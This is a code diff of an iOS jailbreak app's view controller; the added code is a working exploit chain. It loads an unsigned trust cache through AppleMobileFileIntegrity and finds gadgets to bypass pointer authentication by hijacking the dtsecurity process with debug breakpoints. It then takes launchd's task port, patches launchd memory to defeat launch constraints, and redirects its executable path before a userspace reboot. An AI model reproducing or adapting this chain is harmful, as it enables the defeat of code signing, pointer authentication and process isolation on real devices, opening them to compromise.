@@ -10,12 +10,8 @@
 #import "Bootstrap-Swift.h"
 #import <sys/sysctl.h>
 #include <sys/utsname.h>
-
-extern _Atomic bool global_found;
-extern _Atomic uint64_t global_result_ptr;
-extern _Atomic uint32_t global_result_diversifier;
-extern mach_port_t setup_exception_server_with_id(int thread_id);
-
+#include "ProcessContext.h"
+#import <IOKit/IOKitLib.h>
 #include <Security/SecKey.h>
 #include <Security/Security.h>
 typedef struct CF_BRIDGED_TYPE(id) __SecCode const* SecStaticCodeRef; /* code on disk */
@@ -23,6 +19,7 @@ typedef enum { kSecCSDefaultFlags=0, kSecCSSigningInformation = 1 << 1 } SecCSFl
 OSStatus SecStaticCodeCreateWithPathAndAttributes(CFURLRef path, SecCSFlags flags, CFDictionaryRef attributes, SecStaticCodeRef* CF_RETURNS_RETAINED staticCode);
 OSStatus SecCodeCopySigningInformation(SecStaticCodeRef code, SecCSFlags flags, CFDictionaryRef* __nonnull CF_RETURNS_RETAINED information);
 
+mach_port_t dtsecurityTaskPort = MACH_PORT_NULL;
 @import MachO;
 @import Darwin;
 NSDictionary *getLaunchdStringOffsets(void) {
@@ -52,12 +49,9 @@ NSDictionary *getLaunchdStringOffsets(void) {
 
 
 @interface ViewController ()
-// @property(nonatomic) mach_port_t exceptionPort;
 @property(nonatomic) mach_port_t fakeBootstrapPort;
-@property(nonatomic) pid_t *childPids;
-@property(nonatomic) int childPidCount;
-@property(nonatomic) int cpuCount;
-@property(nonatomic) BOOL serversInitialized;
+@property(nonatomic) ProcessContext *dtProc;
+@property(nonatomic) ProcessContext *ubProc;
 @end
 
 BOOL gTweakEnabled=YES;
@@ -84,21 +78,26 @@ BOOL gTweakEnabled=YES;
     ]];
     
     [vc didMoveToParentViewController:self];
-    // Initialize process tracking and server state
-    int mib[2] = {CTL_HW, HW_NCPU};
-    int cpu_count = 1;
-    size_t len = sizeof(cpu_count);
-    sysctl(mib, 2, &cpu_count, &len, NULL, 0);
-    if (cpu_count < 1) cpu_count = 1;
-    if (cpu_count > 8) cpu_count = 8; // Limit to max 8 threads
-
-    self.cpuCount = cpu_count;
-    self.childPidCount = 0;
-    self.serversInitialized = NO;
-    self.childPids = calloc(cpu_count, sizeof(pid_t));
+    
+// load trust cache if available. though this is only loaded once per boot we check it again
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        if(spawn_stage1_prepare_process() != 0) return;
+        
+        NSString *assetDir = [NSFileManager.defaultManager URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask].lastObject.path;
+        NSString *tcPath = [assetDir stringByAppendingPathComponent:@"AssetData/.TrustCache"];
+        if(load_trust_cache(tcPath) == 0) {
+            printf("Trust cache loaded.\n");
+        } else {
+            printf("Failed to load trust cache.\n");
+        }
+        
+        // preflight UpdateBrainService
+        [self.ubProc spawnProcess:@"updatebrain" suspended:NO];
+        printf("Spawned UpdateBrainService with PID %d\n", self.ubProc.pid);
+        
+    });
     // find launchd string offsets
     NSUserDefaults *defaults = NSUserDefaults.standardUserDefaults;
-    if (!defaults.offsetLaunchdPath) {
         NSDictionary *offsets = getLaunchdStringOffsets();
         defaults.offsetLaunchdPath = [offsets[@"/sbin/launchd"] unsignedLongValue];
         // AMFI is only needed for iOS 17.0 to bypass launch constraint
@@ -107,36 +106,233 @@ BOOL gTweakEnabled=YES;
         if (defaults.offsetAMFI) {
             NSLog(@"Found AMFI string offset: 0x%lx\n", defaults.offsetAMFI);
         }
-    }
 
-    bool serversExist = false;
-    for (int i = 0; i < self.cpuCount; i++) {
-        if (check_exception_server_exists(i)) {
-            serversExist = true;
-            break;
-        }
-    }
-
+    
     self.fakeBootstrapPort = setup_fake_bootstrap_server();
-    for (int i = 0; i < self.cpuCount; i++) {
-      setup_exception_server_with_id(i);
-          self.childPids[i] = launchTestWithThread(@"dtsecurity", i);
-            if (self.childPids[i] > 0) {
-              self.childPidCount++;
-              NSLog(@"child process %d with pid %d\n", i, self.childPids[i]);
-            } else {
-              NSLog(@"launch child process fail %d\n", i);
-            }
-
+    self.dtProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.dtsecurity_donor_exception_server"];
+    self.ubProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.updatebrain_exception_server"];
+    
+    // TODO: save offsets
+    // unauthenticated br x8 gadget
+    void *handle = dlopen("/usr/lib/swift/libswiftDistributed.dylib", RTLD_GLOBAL);
+    assert(handle != NULL);
+    uint32_t *func = (uint32_t *)dlsym(RTLD_DEFAULT, "swift_distributed_execute_target");
+    assert(func != NULL);
+    for (; *func != 0xd61f0100; func++) {}
+    brX8Address = (uint64_t)func;
+    printf("Found br x8 at address: 0x%016lx\n", brX8Address);
+    // if br x8 != saved address, clear saved address
+    uint64_t savedPpointer = NSUserDefaults.standardUserDefaults.signedPointer;
+    if (savedPpointer != 0 && (brX8Address&0xFFFFFFFFF) != (savedPpointer&0xFFFFFFFFF)) {
+        printf("br x8 address changed, clearing saved signed pointer\n");
+        NSUserDefaults.standardUserDefaults.signedPointer = 0;
+        NSUserDefaults.standardUserDefaults.signedDiversifier = 0;
     }
-    self.serversInitialized = YES;
-
+    
+    // PAC signing gadget
+    func = (uint32_t *)zeroify_scalable_zone;
+    for (; func[0] != 0xdac10230 || func[1] != 0xf9000110; func++) {}
+    paciaAddress = (uint64_t)func;
+    printf("Found pacia x16, x17 at address: 0x%016lx\n", paciaAddress);
+    
+    // change LR gadget
+    func = (uint32_t *)dispatch_debug;
+    for (; func[0] != 0xaa0103fe || func[1] != 0xf9402008; func++) {}
+    changeLRAddress = (uint64_t)func;
     }
-// void testButtonTapped() {
-//   launchTest(@"dtsecurity");
-//   NSLog(@"launch dtsecurity");
-// }
 
+- (void)loadTrustCacheTapped {
+    // Download arm64 XPC service from Apple which we will use to initiate PAC bypass
+    char *path = "/var/mobile/.TrustCache";
+    int fd = open(path, O_RDONLY);
+    struct stat s;
+    fstat(fd, &s);
+    void *map = mmap(NULL, s.st_size, PROT_READ, MAP_SHARED, fd, 0);
+    assert(map != MAP_FAILED);
+    CFDictionaryRef match = IOServiceMatching("AppleMobileFileIntegrity");
+    io_service_t svc = IOServiceGetMatchingService(0, match);
+    io_connect_t conn;
+    IOServiceOpen(svc, mach_task_self_, 0, &conn);
+    kern_return_t kr = IOConnectCallMethod(conn, 2, NULL, 0, map, s.st_size, NULL, NULL, NULL, NULL);
+    if (kr != KERN_SUCCESS) {
+        printf("IOConnectCallMethod failed: %s\n", mach_error_string(kr));
+    } else {
+        printf("Successfully loaded trust cache from %s\n", path);
+    }
+    IOServiceClose(conn);
+    IOObjectRelease(svc);
+    munmap((void *)map, s.st_size);
+    close(fd);
+}
+
+uint64_t getDyldPACIAOffset(uint64_t _dyld_start) {
+    // w4ever
+    void *handle = dlopen("/usr/lib/dyld", RTLD_GLOBAL);
+    uint32_t *func = (uint32_t *)dlsym(RTLD_DEFAULT, "_dyld_start");
+    uint32_t *dyld_start_func = func;
+    // 1. find where `B start`
+    for (; (*func & 0xFC000000) != 0x14000000;/* b */ func++) {}
+    // printf("B start: %p\n", func);
+    // 2. obtain offset where branch
+    uint32_t imm26 = *func & 0x3ffffff;
+    int32_t off = (int32_t)(imm26 << 2);
+    if (imm26 & (1<<25)) off |= 0xFC000000;
+    // printf("off: %d\n", off);
+    func += off/sizeof(*func);
+    // printf("start: %p\n", func);
+    // 3. find pacia x16, x8
+    for (; (*func & 0xFFFFFFFF) != 0xDAC10110;/* pacia x16, x8 */ func++) {}
+    // printf("pacia x16, x8 in start: %p\n", func);
+    off = (uint32_t)dyld_start_func - (uint32_t)func;
+    uint64_t pacia_inst = _dyld_start - off;
+    return pacia_inst;
+}
+
+- (void)performBypassPAC {
+    kern_return_t kr;
+    vm_size_t page_size = getpagesize();
+    
+    [self.dtProc spawnProcess:@"dtsecurity" suspended:YES];
+    printf("Spawned dtsecurity with PID %d\n", self.dtProc.pid);
+    
+    // attach to dtsecurity
+    kr = (int)RemoteArbCall(self.ubProc, ptrace, PT_ATTACHEXC, self.dtProc.pid, 0, 0);
+    printf("ptrace(PT_ATTACHEXC) returned %d\n", kr);
+    kr = (int)RemoteArbCall(self.ubProc, ptrace, PT_CONTINUE, self.dtProc.pid, 1, 0);
+    printf("ptrace(PT_CONTINUE) returned %d\n", kr);
+    
+    while (!self.dtProc.newState) {
+#warning TODO: maybe another semaphore
+        usleep(200000);
+    }
+    dtsecurityTaskPort = self.dtProc.taskPort;
+    //bootstrap_register(bootstrap_port, "com.kdt.taskporthaxx.dtsecurity_task_port", dtsecurityTaskPort);
+    if(!dtsecurityTaskPort) {
+        printf("dtsecurity task port is null?\n");
+        return;
+    }
+    
+    // create a region which holds temp data
+    vm_address_t map = RemoteArbCall(self.ubProc, mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+    if (!map) {
+        printf("Failed to call mmap\n");
+        return;
+    }
+    
+    // Pass dtsecurity task port to UpdateBrainService
+    RemoteArbCall(self.ubProc, task_get_special_port, 0x203, TASK_BOOTSTRAP_PORT, map);
+    mach_port_t remote_bootstrap_port = [self.ubProc read32:map];
+    vm_address_t xpc_bootstrap_pipe = RemoteArbCall(self.ubProc, xpc_pipe_create_from_port, remote_bootstrap_port, 0, map);
+    printf("xpc_bootstrap_pipe: 0x%lx\n", xpc_bootstrap_pipe);
+    vm_address_t dict = RemoteArbCall(self.ubProc, xpc_dictionary_create_empty);
+    vm_address_t keyStr = [self.ubProc writeString:map+0x10 string:"name"];
+    vm_address_t valueStr = [self.ubProc writeString:map+0x20 string:"port"];
+    RemoteArbCall(self.ubProc, xpc_dictionary_set_string, dict, keyStr, valueStr);
+    RemoteArbCall(self.ubProc, _xpc_pipe_interface_routine, xpc_bootstrap_pipe, 0xcf, dict, map, 0);
+    vm_address_t reply = [self.ubProc read64:map];
+    mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(self.ubProc, xpc_dictionary_copy_mach_send, reply, valueStr);
+    if (!dtsecurity_task) {
+        printf("Failed to get dtsecurity task port from UpdateBrainService\n");
+        return;
+    }
+    printf("Got dtsecurity task port from UpdateBrainService: 0x%x\n", dtsecurity_task);
+    
+    // Get dtsecurity thread port
+    vm_address_t threads = map + 0x10;
+    vm_address_t thread_count = map;
+    [self.ubProc write32:thread_count value:TASK_BASIC_INFO_64_COUNT];
+    kr = (kern_return_t)RemoteArbCall(self.ubProc, task_threads, dtsecurity_task, threads, thread_count);
+    if (kr != KERN_SUCCESS) {
+        printf("task_threads failed: %s\n", mach_error_string(kr));
+        return;
+    }
+    threads = [self.ubProc read64:threads];
+    thread_t dtsecurity_thread = (thread_t)[self.ubProc read32:threads];
+    printf("dtsecurity thread port: 0x%x\n", dtsecurity_thread);
+    
+    // Get dtsecurity debug state
+    arm_debug_state64_t *debug_state = (arm_debug_state64_t *)(map + 0x10);
+    vm_address_t debug_state_count = map;
+    [self.ubProc write32:debug_state_count value:ARM_DEBUG_STATE64_COUNT];
+    kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_get_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, debug_state_count);
+    if (kr != KERN_SUCCESS) {
+        printf("thread_get_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
+        return;
+    }
+    
+    // Set hardware breakpoint 1 to pacia instruction
+    uint64_t _dyld_start = self.dtProc.newState->__pc;
+    xpaci(_dyld_start);
+    uint64_t pacia_inst = getDyldPACIAOffset(_dyld_start);
+    printf("_dyld_start: 0x%llx\n", _dyld_start);
+    printf("pacia: 0x%llx\n", pacia_inst);
+    [self.ubProc write64:(uint64_t)&debug_state->__bvr[0] value:pacia_inst];
+    [self.ubProc write64:(uint64_t)&debug_state->__bcr[0] value:0x1e5];
+    kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_set_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, ARM_DEBUG_STATE64_COUNT);
+    if (kr != KERN_SUCCESS) {
+        printf("thread_set_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
+        return;
+    }
+    
+    printf("Bypassing PAC right now\n");
+    
+    // Clear SIGTRAP
+    kr = (int)RemoteArbCall(self.ubProc, ptrace, PT_THUPDATE, self.dtProc.pid, dtsecurity_thread, 0);
+    RemoteArbCall(self.ubProc, kill, self.dtProc.pid, SIGCONT);
+    self.dtProc.expectedLR = 0;
+    [self.dtProc resume];
+    printf("Resume1:\n");
+    printf("PC: 0x%llx\n", self.dtProc.newState->__pc);
+    
+    // This shall step to pacia instruction
+    self.dtProc.expectedLR = (uint64_t)-1;
+    [self.dtProc resume];
+    printf("Resume2:\n");
+    printf("PC: 0x%llx\n", self.dtProc.newState->__pc);
+    
+    uint64_t currPC = self.dtProc.newState->__pc;
+    xpaci(currPC);
+    if (currPC != pacia_inst) {
+        printf("Did not hit pacia breakpoint?\n");
+        return;
+    }
+    
+    printf("We hit PACIA breakpoint!\n");
+    self.dtProc.newState->__x[16] = brX8Address;
+    self.dtProc.newState->__x[8] = 0x74810000AA000000; // 'pc' discriminator, 0xAA diversifier
+    
+    // Move our hardware breakpoint to the next instruction after pacia
+    // TODO: maybe single step instead?
+    [self.ubProc write64:(uint64_t)&debug_state->__bvr[0] value:pacia_inst+4];
+    [self.ubProc write64:(uint64_t)&debug_state->__bcr[0] value:0x1e5];
+    kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_set_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, ARM_DEBUG_STATE64_COUNT);
+    if (kr != KERN_SUCCESS) {
+        printf("thread_set_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
+        return;
+    }
+    
+    [self.dtProc resume];
+    printf("Resume3:\n");
+    printf("PC: 0x%llx\n", self.dtProc.newState->__pc);
+    
+    brX8Address = self.dtProc.newState->__x[16];
+    printf("Signed Pointer: 0x%lx\n", brX8Address);
+    
+    // At this point we have corrupted x16 and x8 to sign br x8 gadget, it's quite complicated
+    // to continue from here as we need to have a signed pacia beforehand, then sign br x8 and
+    // set registers back to repair. Instead we will kill and replace dtsecurity.
+    printf("Cleaning up after PAC bypass\n");
+    RemoteArbCall(self.ubProc, ptrace, PT_KILL, self.dtProc.pid);
+    RemoteArbCall(self.ubProc, kill, self.dtProc.pid, SIGKILL);
+    [self.dtProc terminate];
+    [self.ubProc terminate];
+    self.ubProc = nil;
+}
+
+#define RemoteRead32(addr) [self.dtProc read32:addr]
+#define RemoteRead64(addr) [self.dtProc read64:addr]
+#define RemoteWrite32(addr, value_) [self.dtProc write32:addr value:value_]
+#define RemoteWrite64(addr, value_) [self.dtProc write64:addr value:value_]
 - (void)arbCallButtonTapped
 {
     [self arbCallButtonTappedFromSwiftUI];
@@ -144,139 +340,198 @@ BOOL gTweakEnabled=YES;
 
 - (void)arbCallButtonTappedFromSwiftUI
 {
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-
+    
+dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        if (*(uint32_t *)getpagesize == 0xd503237f) {
+            // we know this is arm64e hardware if some function starts with pacibsp
+            [self performBypassPAC];
+        }
+        
         kern_return_t kr;
-
-        int mib[2] = {CTL_HW, HW_NCPU};
-        int cpu_count = 1;
-        size_t len = sizeof(cpu_count);
-        sysctl(mib, 2, &cpu_count, &len, NULL, 0);
-        if (cpu_count < 1) cpu_count = 1;
-
-        NSLog(@"init bruteforce %d threads\n", cpu_count);
-
-                // while (!global_found) {
-        //     usleep(50000);
-        // }
-
-        // NSLog(@"pac ret ptr=0x%llx, div=0x%x\n", global_result_ptr, global_result_diversifier);
-
         vm_size_t page_size = getpagesize();
-        vm_address_t map = RemoteArbCall(mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+        
+        self.dtProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.dtsecurity_exception_server"];
+        [self.dtProc spawnProcess:@"dtsecurity" suspended:NO];
+        printf("Spawned dtsecurity with PID %d\n", self.dtProc.pid);
+        
+        // Change LR
+        while (!self.dtProc.newState) {
+#warning TODO: maybe another semaphore
+            usleep(200000);
+        }
+        self.dtProc.newState->__lr = 0xFFFFFF00;
+        self.dtProc.newState->__flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
+                                           __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR |
+                                           __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC);
+        
+        // Create a region which holds temp data (should we use stack instead?)
+        vm_address_t map = RemoteArbCall(self.dtProc, mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
         if (!map) {
-            NSLog(@"Failed to call mmap. Using found PAC directly\n");
+            printf("Failed to call mmap. Please try resetting pointer and try again\n");
             return;
         }
-
-        mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(task_self_trap);
-
+        printf("Mapped memory at 0x%lx\n", map);
+        
+        // Test mkdir
+//        RemoteWriteString(map, "/tmp/.it_works");
+//        RemoteArbCall(self.dtProc, mkdir, map, 0700);
+        
+        // Get my task port
+        mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(self.dtProc, task_self_trap);
+//        kr = (kern_return_t)RemoteArbCall(self.dtProc, task_for_pid, dtsecurity_task, getpid(), map);
+//        if (kr != KERN_SUCCESS) {
+//            printf("Failed to get my task port\n");
+//            return;
+//        }
+//        mach_port_t my_task = (mach_port_t)RemoteRead32(map);
+        // Map the page we allocated in dtsecurity to this process
+//        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_remap, my_task, map, page_size, 0, VM_FLAGS_ANYWHERE, dtsecurity_task, map, false, map+8, map+12, VM_INHERIT_SHARE);
+//        if (kr != KERN_SUCCESS) {
+//            printf("Failed to create dtsecurity<->haxx shared mapping\n");
+//            return;
+//        }
+//        vm_address_t local_map = RemoteRead64(map);
+//        printf("Created shared mapping: 0x%lx\n", local_map);
+//        printf("read: 0x%llx\n", *(uint64_t *)local_map);
+        
         // Get dtsecurity dyld base for blr x19
         RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
-        kr = (kern_return_t)RemoteArbCall(task_info, dtsecurity_task, TASK_DYLD_INFO, map + 8, map);
+         kr = (kern_return_t)RemoteArbCall(self.dtProc, task_info, dtsecurity_task, TASK_DYLD_INFO, map + 8, map);
         if (kr != KERN_SUCCESS) {
-            NSLog(@"task_info failed\n");
+            printf("task_info failed\n");
             return;
         }
         struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr));
         vm_address_t remote_dyld_base;
         do {
             remote_dyld_base = RemoteRead64((uint64_t)&remote_dyld_all_image_infos_addr->dyldImageLoadAddress);
+            // FIXME: why do I have to sleep a bit for dyld base to be available?
             usleep(100000);
         } while (remote_dyld_base == 0);
-        NSLog(@"dtsecurity dyld base: 0x%lx\n", remote_dyld_base);
-
+        printf("dtsecurity dyld base: 0x%lx\n", remote_dyld_base);
+        
         // Get launchd task port
-        kr = (kern_return_t)RemoteArbCall(task_for_pid, dtsecurity_task, 1, map);
+        kr = (kern_return_t)RemoteArbCall(self.dtProc, task_for_pid, dtsecurity_task, 1, map);
         if (kr != KERN_SUCCESS) {
-            NSLog(@"Failed to get launchd task port\n");
+            printf("Failed to get launchd task port\n");
             return;
         }
-
+        
         mach_port_t launchd_task = (mach_port_t)RemoteRead32(map);
-        NSLog(@"Got launchd task port: %d\n", launchd_task);
-
+        printf("Got launchd task port: %d\n", launchd_task);
+        
         // Get remote dyld base
         RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
-        kr = (kern_return_t)RemoteArbCall(task_info, launchd_task, TASK_DYLD_INFO, map + 8, map);
+        kr = (kern_return_t)RemoteArbCall(self.dtProc, task_info, launchd_task, TASK_DYLD_INFO, map + 8, map);
         if (kr != KERN_SUCCESS) {
-            NSLog(@"task_info failed\n");
+            printf("task_info failed\n");
             return;
         }
         remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr));
-
-        kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArrayCount, sizeof(uint32_t), map, map + 8);
+        printf("launchd dyld_all_image_infos_addr: %p\n", remote_dyld_all_image_infos_addr);
+        
+        // uint32_t infoArrayCount = &remote_dyld_all_image_infos_addr->infoArrayCount;
+        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArrayCount, sizeof(uint32_t), map, map + 8);
         if (kr != KERN_SUCCESS) {
-            NSLog(@"vm_read_overwrite _dyld_all_image_infos->infoArrayCount failed\n");
+            printf("vm_read_overwrite _dyld_all_image_infos->infoArrayCount failed\n");
             return;
         }
         uint32_t infoArrayCount = RemoteRead32(map);
-
-        kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArray, sizeof(uint64_t), map, map + 8);
+        printf("launchd infoArrayCount: %u\n", infoArrayCount);
+        
+        //const struct dyld_image_info* infoArray = &remote_dyld_all_image_infos_addr->infoArray;
+        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArray, sizeof(uint64_t), map, map + 8);
         if (kr != KERN_SUCCESS) {
-            NSLog(@"vm_read_overwrite _dyld_all_image_infos->infoArray failed\n");
+            printf("vm_read_overwrite _dyld_all_image_infos->infoArray failed\n");
             return;
         }
-
+        
         // Enumerate images to find launchd base
         vm_address_t launchd_base = 0;
         vm_address_t infoArray = RemoteRead64(map);
         for (int i = 0; i < infoArrayCount; i++) {
-            kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, infoArray + sizeof(uint64_t[i*3]), sizeof(uint64_t), map, map + 8);
+            kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, infoArray + sizeof(uint64_t[i*3]), sizeof(uint64_t), map, map + 8);
             uint64_t base = RemoteRead64(map);
             if (base % page_size) {
+                // skip unaligned entries, as they are likely in dsc
                 continue;
             }
-            kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, base, 16, map, map + 16);
+            printf("Image[%d] = 0x%llx\n", i, base);
+            // read magic, cputype, cpusubtype, filetype
+            kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, base, 16, map, map + 16);
             uint64_t magic = RemoteRead32(map);
             if (magic != MH_MAGIC_64) {
+                printf("not a mach-o (magic: 0x%x)\n", (uint32_t)magic);
                 continue;
             }
             uint32_t filetype = RemoteRead32(map + 12);
             if (filetype == MH_EXECUTE) {
+                printf("found launchd executable at 0x%llx\n", base);
                 launchd_base = base;
                 break;
             }
         }
-
-        // Reprotect and patch
+        
+        // Reprotect rw
+        // minimum page = 0x5f000;
         vm_offset_t launchd_str_off = NSUserDefaults.standardUserDefaults.offsetLaunchdPath;
         vm_offset_t amfi_str_off = NSUserDefaults.standardUserDefaults.offsetAMFI;
-
-        NSLog(@"reprotecting 0x%lx\n", launchd_base + launchd_str_off);
-        RemoteChangeLR(0xFFFFFF00);
-        kr = (kern_return_t)RemoteArbCall(vm_protect, launchd_task, (launchd_base + launchd_str_off), 0x4000*4, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
-        if (kr != KERN_SUCCESS) {
-            NSLog(@"vm_protect failed: kr = %s\n", mach_error_string(kr));
-            sleep(5);
-            return;
-        }
-       // https://github.com/wh1te4ever/TaskPortHaxxApp/commit/327022fe73089f366dcf1d0d75012e6288916b29
-       // Bypass panic by launch constraints
-       // Method 2: Patch `AMFI` string that being used as _amfi_launch_constraint_set_spawnattr's arguments
-        const char *newStr = "AAAA\x00";
-        RemoteWriteString(map, newStr);
-        RemoteChangeLR(0xFFFFFF00);
-        kr = (kern_return_t)RemoteArbCall(vm_write, launchd_task, launchd_base + amfi_str_off, map, 5);
-        if (kr != KERN_SUCCESS) {
-            NSLog(@"vm_write amfi string failed\n");
-            sleep(5);
-            return;
-        }
-
-        const char *newPath = jbroot(@"/basebin/sbin/launchd").UTF8String;
-        RemoteWriteString(map, newPath);
-        RemoteChangeLR(0xFFFFFF00);
-        kr = (kern_return_t)RemoteArbCall(vm_write, launchd_task, launchd_base + launchd_str_off, map, strlen(newPath));
-        if (kr != KERN_SUCCESS) {
-            NSLog(@"vm_write launchd string failed\n");
-            sleep(5);
-            return;
-        }
-        NSLog(@"Successfully overwrote launchd executable path string to %s\n", newPath);
-
-        RemoteArbCall(exit, 0);
         
+        printf("reprotecting 0x%lx\n", launchd_base + launchd_str_off);
+        if (amfi_str_off){
+          printf("amfi string offset: 0x%lx\n", launchd_base + amfi_str_off);
+        self.dtProc.lr = 0xFFFFFF00; // fix autibsp
+        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_protect, launchd_task, launchd_base + amfi_str_off, 0x20, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
+        if (kr != KERN_SUCCESS) {
+            printf("vm_protect failed: kr = %s\n", mach_error_string(kr));
+            sleep(5);
+            return;
+        }
+        }
+        // w4ever
+        // kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_protect, launchd_task, launchd_base + launchd_str_off & ~PAGE_MASK, 0x8000, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
+
+        self.dtProc.lr = 0xFFFFFF00; // fix autibsp
+        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_protect, launchd_task, launchd_base + launchd_str_off, 0x20, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
+        if (kr != KERN_SUCCESS) {
+            printf("vm_protect failed: kr = %s\n", mach_error_string(kr));
+            sleep(5);
+            return;
+        }
+        
+        // https://github.com/wh1te4ever/TaskPortHaxxApp/commit/327022fe73089f366dcf1d0d75012e6288916b29
+        // Bypass panic by launch constraints
+        // Method 2: Patch `AMFI` string that being used as _amfi_launch_constraint_set_spawnattr's arguments
+
+        // Patch string `AMFI`
+        if (amfi_str_off) {
+        printf("amfi patch");
+        const char *newStr = "AAAA\x00";
+        [self.dtProc writeString:map string:newStr];
+        self.dtProc.lr = 0xFFFFFF00; // fix autibsp
+        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_write, launchd_task, launchd_base + amfi_str_off, map, 5);
+        if (kr != KERN_SUCCESS) {
+            printf("vm_write failed\n");
+            sleep(5);
+            return;
+        }
+        [self.dtProc taskHexDump:launchd_base + amfi_str_off size:0x100 task:(mach_port_t)launchd_task map:(uint64_t)map];
+        }
+        // Overwrite /sbin/launchd string to /var/.launchd
+        const char *newPath = jbroot(@"/sbin/launchd").UTF8String;
+        [self.dtProc writeString:map string:newPath];
+        self.dtProc.lr = 0xFFFFFF00; // fix autibsp
+        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_write, launchd_task, launchd_base + launchd_str_off, map, strlen(newPath));
+        if (kr != KERN_SUCCESS) {
+            printf("vm_write failed\n");
+            sleep(5);
+            return;
+        }
+        printf("Successfully overwrote launchd executable path string to %s\n", newPath);
+        sleep(5);
+        userspaceReboot();
+        //RemoteArbCall(self.dtProc, exit, 0);
+
     });
 }
 BOOL updateOpensshStatus(BOOL notify)
@@ -397,21 +652,6 @@ void initFromSwiftUI()
         {
             [AppDelegate showMesage:Localized(@"It seems that you have the Filza installed in trollstore, which may be detected as jailbroken. You can remove it from trollstore then install Filza from roothide repo in Sileo.") title:Localized(@"Warning")];
         }
-    }
-}
-
-- (void)dealloc {
-    if (self.childPids) {
-        NSLog(@"Cleaning up %d child processes\n", self.childPidCount);
-        kill_child_processes(self.childPids, self.cpuCount);
-        free(self.childPids);
-        self.childPids = NULL;
-    }
-
-    if (self.serversInitialized) {
-        NSLog(@"Cleaning up bootstrap servers\n");
-        cleanup_bootstrap_servers(self.cpuCount);
-        self.serversInitialized = NO;
     }
 }
 
